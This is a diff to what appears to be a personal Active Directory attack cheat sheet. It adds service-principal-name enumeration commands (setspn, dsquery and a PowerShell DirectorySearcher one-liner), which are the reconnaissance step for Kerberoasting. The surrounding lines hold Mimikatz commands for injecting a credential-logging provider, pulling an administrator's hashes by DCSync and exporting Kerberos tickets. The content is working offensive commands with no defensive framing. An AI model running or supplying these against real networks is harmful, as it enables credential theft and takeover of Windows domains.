@@ -19,6 +19,14 @@ misc::memssp
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
+setspn -L <CN - HOSTNAME (or) USERNAME>
+
+dsquery * "dc=contoso,dc=fs,dc=com" -filter "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))" -attr distinguishedName servicePrincipalName
+
+$a="(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))";$b=New-Object System.DirectoryServices.DirectoryEntry;$c=New-Object System.DirectoryServices.DirectorySearcher;$c.SearchRoot=$b;$c.PageSize=1000;$c.Filter=$a;$c.SearchScope="Subtree";$d=$c.FindAll();foreach($e in $d){$userEntry=$e.GetDirectoryEntry();Write-Host "User: " $userEntry.name;foreach($SPN in $userEntry.servicePrincipalName){Write-Host $SPN}Write-Host ""}
+
+****************************************************************************************************************************************
+
 lsadump::dcsync /domain:<Fully Qualified Domain Name> /user:<ADMIN Username>
 
 sekurlsa::tickets /export
